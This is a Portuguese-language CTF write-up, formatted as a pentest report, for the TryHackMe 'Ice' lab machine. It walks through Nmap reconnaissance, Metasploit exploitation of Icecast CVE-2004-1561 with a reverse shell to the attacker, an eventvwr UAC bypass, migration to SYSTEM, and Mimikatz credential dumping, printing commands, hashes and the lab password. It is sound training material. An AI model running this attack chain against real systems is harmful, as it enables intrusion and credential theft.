# ❄️ Ice — CTF Writeup
### TryHackMe | Boot-to-Root | Exploração de Serviço Vulnerável (Icecast) · Bypass UAC · Extração de Credenciais (Mimikatz)

---

| **Analista**          | Mauricio Robert                                                                        |
|-----------------------|----------------------------------------------------------------------------------------|
| **Organização**       | Faculdade Impacta                                                                      |
| **Data do Relatório** | 23/07/2026                                                                             |
| **Data do Pentest**   | 23/07/2026 · 08:02 – 08:31 (GMT-3)                                                     |
| **Alvo**              | `10.64.185.106` — TryHackMe · Ice (DARK-PC)                                            |
| **Classificação**     | CONFIDENCIAL                                                                           |
| **Ferramentas**       | Nmap 7.99 · Metasploit Framework 6.4.135-dev · Mimikatz/Kiwi 2.2.0                    |
| **Plataforma**        | TryHackMe — Boot-to-Root                                                               |

---

## 🔍 Resumo Executivo

Este relatório documenta o comprometimento completo da máquina **Ice** (TryHackMe), um host **Windows 7 Professional SP1** (`DARK-PC`), em aproximadamente **29 minutos**, por meio de uma cadeia de ataque encadeando reconhecimento de rede, identificação de uma versão vulnerável do serviço **Icecast Streaming Media Server** (`CVE-2004-1561`), exploração remota via Metasploit para acesso inicial, escalada de privilégios através de **bypass de UAC**, elevação para `NT AUTHORITY\SYSTEM` via migração de processo e extração de credenciais em memória com **Mimikatz (Kiwi)**. Nenhuma técnica de engenharia social foi necessária — o comprometimento total dependeu exclusivamente de uma **vulnerabilidade de software conhecida e desatualizada** combinada com uma **configuração padrão insegura de UAC**. O sistema foi comprometido de ponta a ponta, culminando em acesso `SYSTEM` e na extração da senha em texto claro do usuário `Dark`.

---

## 🛠 Ferramentas Utilizadas

| Ferramenta               | Versão       | Finalidade                                                                          |
|---------------------------|--------------|--------------------------------------------------------------------------------------|
| **Nmap**                  | 7.99         | Varredura de portas e fingerprinting de serviços (`-sV -sC -A`)                     |
| **CVEdetails.com**        | Online       | Pesquisa e confirmação da vulnerabilidade `CVE-2004-1561`                            |
| **Metasploit Framework**  | 6.4.135-dev  | Exploração do Icecast (`icecast_header`) e escalada de privilégios (`bypassuac_eventvwr`) |
| **Meterpreter**           | -            | Pós-exploração: `migrate`, `getuid`, `getprivs`, `ps`                                |
| **Mimikatz (Kiwi)**       | 2.2.0        | Extração de credenciais em memória (`creds_all`)                                     |

---

## 📋 Fases de Comprometimento

### FASE 1 — Reconhecimento: Varredura Nmap

> **08:02 GMT-3 · Nmap 7.99 · Alvo: 10.64.185.106**

**Comando:**
```bash
nmap -sV -sC -A 10.64.185.106
```

A varredura com detecção de serviços, scripts padrão e fingerprinting de sistema operacional identificou um host **Windows 7 Professional 7601 Service Pack 1** (workgroup `WORKGROUP`, hostname `DARK-PC`), com múltiplos serviços expostos:

```
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows 7 Professional 7601 Service Pack 1 microsoft-ds
3389/tcp  open  tcpwrapped
| ssl-cert: Subject: commonName=Dark-PC
5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8000/tcp  open  http          Icecast streaming media server
```

Informações adicionais relevantes do script `smb-os-discovery`:

```
OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
Computer name: Dark-PC
NetBIOS computer name: DARK-PC
Workgroup: WORKGROUP
```

![Nmap](/CTFs/ICE/images/Scan_Nmap.png)

O serviço na porta **8000/tcp**, identificado como **Icecast streaming media server**, chamou atenção imediata por se tratar de um software de terceiros — potencial vetor de exploração remota.

---

### FASE 2 — Análise de Vulnerabilidade: Icecast (CVE-2004-1561)

> **~08:08 GMT-3 · CVEdetails.com**

A pesquisa pela versão do Icecast identificado na varredura revelou a vulnerabilidade **`CVE-2004-1561`** — um **buffer overflow** no parsing de cabeçalhos HTTP das versões 2.0.1 e anteriores do Icecast, descoberto por Luigi Auriemma. O envio de **32 cabeçalhos HTTP** causa uma escrita além do limite de um array de ponteiros, sobrescrevendo, no Windows, a instrução salva e permitindo **execução arbitrária de código**.

**Dados da vulnerabilidade:**

| Campo | Valor |
|-------|-------|
| CVSS Base Score | **7.5** (severidade HIGH) |
| Exploitability Score | **10.0** |
| Impact Score | 6.4 |
| Módulo Metasploit | `exploit/windows/http/icecast_header` |
| Disclosure Date | 2004-09-28 |

A existência de um módulo nativo no Metasploit Framework confirmou a viabilidade imediata de exploração remota.

![CVE](/CTFs/ICE/images/Vulnerable_Service_and_Exploit.png)

---

### FASE 3 — Exploração: Metasploit `icecast_header` (Acesso Inicial)

> **08:12 GMT-3 · msfconsole**

**Comandos:**
```bash
use exploit/windows/http/icecast_header
set rhosts 10.64.185.106
set rport 8000
set lhost 192.168.157.47
exploit
```

A primeira tentativa de exploração, com o `LHOST` incorretamente configurado (`192.168.1.10`), foi concluída **sem estabelecer sessão**. Após corrigir o parâmetro para o endereço correto da máquina atacante (`192.168.157.47`), a exploração foi bem-sucedida:

```
[*] Started reverse TCP handler on 192.168.157.47:4444
[*] Sending stage (199238 bytes) to 10.64.185.106
[*] Meterpreter session 1 opened (192.168.157.47:4444 → 10.64.185.106:49235) at 2026-07-23 08:12:04 -0300

meterpreter >
```
![Exploit](/CTFs/ICE/images/Exploit_Complete.png)
A sessão obtida executava no contexto do processo `Icecast2.exe`, sob o usuário **`Dark-PC\Dark`** — acesso inicial válido, porém **sem privilégios administrativos completos** no host.

---

### FASE 4 — Escalada de Privilégios: Local Exploit Suggester + BypassUAC

> **08:27 GMT-3 · post/multi/recon/local_exploit_suggester**

**Comando:**
```bash
use post/multi/recon/local_exploit_suggester
run
```

O módulo testou **255 verificações de exploits locais** para x86/Windows contra a sessão ativa, identificando múltiplos vetores de escalada de privilégio compatíveis com um Windows 7 SP1 (build 7601) desatualizado, entre eles:

```
bypassuac_comhijack · bypassuac_eventvwr · cve_2020_0787_bits_arbitrary_file_move
ms10_092_schelevator · ms13_053_schlamperei · ms14_058_track_popup_menu
ms15_051_client_copy_image · ntusermndragover · ppr_flatten_rec
tokenmagic · persistence/bits
```

O módulo **`bypassuac_eventvwr`** foi selecionado para exploração:

```bash
use exploit/windows/local/bypassuac_eventvwr
set session 1
set lhost 192.168.157.47
exploit
```

```
[+] Part of Administrators group! Continuing...
[+] UAC is set to Default
[+] BypassUAC can bypass this setting, continuing...
[*] Executing payload: C:\Windows\SysWOW64\eventvwr.exe
[+] eventvwr.exe executed successfully, waiting 10 seconds for the payload to execute.
[*] Sending stage (199238 bytes) to 10.65.160.88
[*] Meterpreter session 2 opened (192.168.157.47:4444 → 10.65.160.88:49229) at 2026-07-23 08:31:18 -0300
```

A configuração confirmou que o usuário `Dark-PC\Dark` fazia parte do grupo **Administrators local** e que o UAC estava no nível **Default** — condição suficiente para o bypass via `eventvwr.exe`.

![UAC](/CTFs/ICE/images/Escalate_Privilege.png)
> 🚩 **UAC BYPASS — SESSÃO ELEVADA (grupo Administrators)**

---

### FASE 5 — Elevação para SYSTEM: Migração de Processo

> **~08:29 GMT-3 · Meterpreter · ps / migrate / getuid**

**Comando:**
```
ps
```

A listagem de processos revelou diversos processos em execução sob **`NT AUTHORITY\SYSTEM`**, incluindo `spoolsv.exe` (PID 1248). A migração da sessão Meterpreter para esse processo do sistema operacional elevou o contexto de execução sem depender de credenciais adicionais:

```
meterpreter > migrate 1248
[*] Migrating from 2148 to 1248...
[*] Migration completed successfully.
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```
![System](/CTFs/ICE/images/NT%20AUTHORITY_SYSTEM.png)
> 🚩 **ACESSO SYSTEM — CONFIRMADO: `NT AUTHORITY\SYSTEM`**

---

### FASE 6 — Pós-Exploração: Mimikatz (Kiwi) e Extração de Credenciais

> **~08:30 GMT-3 · load kiwi · creds_all**

Com privilégios `SYSTEM` estabelecidos, a extensão **Kiwi (Mimikatz 2.2.0)** foi carregada na sessão Meterpreter:

```
meterpreter > load kiwi
Loading extension kiwi...
  mimikatz 2.2.0 20191125 (x64/windows)
Success.
```

A execução de `creds_all`, rodando como `SYSTEM`, extraiu diretamente da memória (LSASS) as credenciais do usuário `Dark-PC\Dark`:

```
meterpreter > creds_all
[+] Running as SYSTEM
[*] Retrieving all credentials

msv credentials
===============
Username  Domain   LM                                NTLM                              SHA1
--------  ------   --                                ----                              ----
Dark      Dark-PC  e52cac67419a9a22ecb08369099ed302  7c4fe5eada682714a036e39378362bab  0d082c4b4f2aeafb67fd0ea568a997e9d3ebc0eb

wdigest credentials
====================
Username  Domain   Password
--------  ------   --------
Dark      Dark-PC  Password01!

tspkg credentials
===================
Username  Domain   Password
--------  ------   --------
Dark      Dark-PC  Password01!
```

![Credentials](/CTFs/ICE/images/Creds_of_Dark-PC.png)
> 🚩 **CREDENCIAL EXTRAÍDA — `Dark-PC\Dark` : `Password01!`**

---

## ⛓ Linha do Tempo do Comprometimento

```
[08:02 GMT-3] FASE 1 — RECONHECIMENTO (Nmap 7.99)
    Varredura -sV -sC -A sobre 10.64.185.106
    Host: Windows 7 Professional SP1 (DARK-PC)
    Portas: 135, 139, 445, 3389/RDP, 5357, 8000/Icecast
    ↓
[08:08 GMT-3] FASE 2 — ANÁLISE DE VULNERABILIDADE
    Icecast 2.0.1 → CVE-2004-1561 (buffer overflow, CVSS 7.5 HIGH)
    Módulo Metasploit disponível: exploit/windows/http/icecast_header
    ↓
[08:12 GMT-3] FASE 3 — EXPLORAÇÃO (Metasploit icecast_header)
    set rhosts 10.64.185.106 / set lhost 192.168.157.47 / exploit
    Meterpreter session 1 como Dark-PC\Dark (processo Icecast2.exe)
    ↓
[08:27 GMT-3] FASE 4 — ESCALADA DE PRIVILÉGIOS (BypassUAC)
    local_exploit_suggester → 255 checks → vários vetores vulneráveis
    exploit/windows/local/bypassuac_eventvwr → sessão elevada
    Meterpreter session 2 (grupo Administrators) ✓
    ↓
[08:29 GMT-3] FASE 5 — ELEVAÇÃO PARA SYSTEM
    ps → spoolsv.exe (PID 1248, NT AUTHORITY\SYSTEM)
    migrate 1248 → getuid
    ACESSO SYSTEM CONFIRMADO ✓
    ↓
[08:30 GMT-3] FASE 6 — PÓS-EXPLORAÇÃO (Mimikatz/Kiwi)
    load kiwi → creds_all
    CREDENCIAL: Dark-PC\Dark : Password01! ✓
    ↓
[08:31 GMT-3] COMPROMETIMENTO TOTAL — NT AUTHORITY\SYSTEM
    Duração total: ~29 minutos
```

---

## 🗺 Mapeamento Investigativo

| Fase | Ferramenta/Técnica | Achado |
|------|--------------------|--------|
| Reconhecimento | Nmap 7.99 (`-sV -sC -A`) | Windows 7 SP1 (DARK-PC); Icecast na porta 8000/tcp |
| Análise de Vulnerabilidade | CVEdetails.com | `CVE-2004-1561` — Icecast buffer overflow (CVSS 7.5 HIGH) |
| Exploração Inicial | Metasploit `icecast_header` | Sessão Meterpreter como `Dark-PC\Dark` |
| Escalada de Privilégios | `local_exploit_suggester` + `bypassuac_eventvwr` | Sessão elevada (grupo Administrators) |
| Elevação para SYSTEM | `migrate` + `getuid` | `NT AUTHORITY\SYSTEM` confirmado |
| Extração de Credenciais | Mimikatz (Kiwi) — `creds_all` | Credencial: `Dark:Password01!` |

---

## 🚨 Artefatos e Indicadores Identificados

| Tipo | Indicador | Contexto |
|------|-----------|----------|
| Alvo | `10.64.185.106` | Máquina Ice (TryHackMe) — Windows 7 Professional SP1, hostname `DARK-PC` |
| Serviços expostos | `135,139,445/TCP` (SMB/RPC) · `3389/TCP` (RDP) · `8000/TCP` (Icecast) | Superfície de ataque inicial |
| Serviço vulnerável | Icecast Streaming Media Server 2.0.1 | Buffer overflow no parsing de cabeçalhos HTTP |
| Vulnerabilidade | `CVE-2004-1561` | CVSS Base 7.5 (HIGH); módulo Metasploit nativo |
| Exploit de acesso inicial | `exploit/windows/http/icecast_header` | Sessão Meterpreter como `Dark-PC\Dark` |
| Exploit de escalada | `exploit/windows/local/bypassuac_eventvwr` | Bypass de UAC (nível Default) via `eventvwr.exe` |
| Processo alvo de migração | `spoolsv.exe` (PID 1248) | Processo `NT AUTHORITY\SYSTEM` usado para elevação |
| Ferramenta de pós-exploração | Mimikatz (Kiwi) 2.2.0 | Extração de credenciais em memória via LSASS |
| Credencial comprometida | `Dark-PC\Dark : Password01!` | Extraída via `creds_all` (WDigest/TsPkg) |
| Técnica (MITRE ATT&CK) | `T1190` | Exploit Public-Facing Application |
| Técnica (MITRE ATT&CK) | `T1548.002` | Abuse Elevation Control Mechanism: Bypass User Account Control |
| Técnica (MITRE ATT&CK) | `T1003.001` | OS Credential Dumping: LSASS Memory |

---

## ✅ Resumo dos Marcos de Comprometimento

| # | Marco | Valor / Resultado |
|---|-------|--------------------|
| 🚩 Acesso Inicial | Sessão Meterpreter | `Dark-PC\Dark` (via Icecast) |
| 🚩 Escalada de Privilégios | Bypass UAC | Sessão elevada (grupo Administrators) |
| 🚩 Acesso SYSTEM | `getuid` | `NT AUTHORITY\SYSTEM` |
| 🚩 Credencial Extraída | Mimikatz `creds_all` | `Dark-PC\Dark : Password01!` |

---

## 📚 Referências

- [TryHackMe — Ice](https://tryhackme.com/room/ice)
- [Nmap Reference Guide](https://nmap.org/book/man.html)
- [CVE-2004-1561 — CVEdetails](https://www.cvedetails.com/cve/CVE-2004-1561/)
- [Metasploit Documentation](https://docs.metasploit.com)
- [Mimikatz — Benjamin Delpy](https://github.com/gentilkiwi/mimikatz)
- [MITRE ATT&CK T1190 — Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/)
- [MITRE ATT&CK T1548.002 — Abuse Elevation Control: Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002/)
- [MITRE ATT&CK T1003.001 — OS Credential Dumping: LSASS Memory](https://attack.mitre.org/techniques/T1003/001/)

---